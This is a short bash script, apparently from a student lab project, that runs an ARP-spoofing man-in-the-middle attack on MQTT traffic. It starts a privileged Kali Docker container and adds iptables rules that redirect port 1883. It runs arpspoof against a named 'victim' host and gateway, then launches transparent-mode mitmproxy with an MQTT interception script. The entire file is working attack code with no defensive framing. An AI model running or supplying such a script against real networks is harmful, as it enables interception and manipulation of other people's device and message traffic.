#!/bin/bash

ip_victima=192.168.0.19
gw=192.168.0.20
interface=wlp42s0

echo -e "\n executant arp spoofing \n"
sudo docker run -d --name mitm  --privileged --network host -v "$(pwd)/escaner":/home kalitfg sleep infinity
sudo docker exec -it mitm bash -c "apt update && sysctl -w net.ipv4.ip_forward=1 && iptables -t nat -A PREROUTING -p tcp --dport 1883 -j REDIRECT && iptables -t nat -A POSTROUTING -p tcp --dport 1883 -j SNAT --to-source $ip_victima" 
sudo docker exec -d mitm bash -c "arpspoof -i $interface -t $ip_victima -r $gw"

sudo docker exec -it mitm bash -c "mitmproxy --mode transparent --listen-port 1883 --tcp-hosts '.*' -s /home/mqtt_mitm.py "

echo "fi"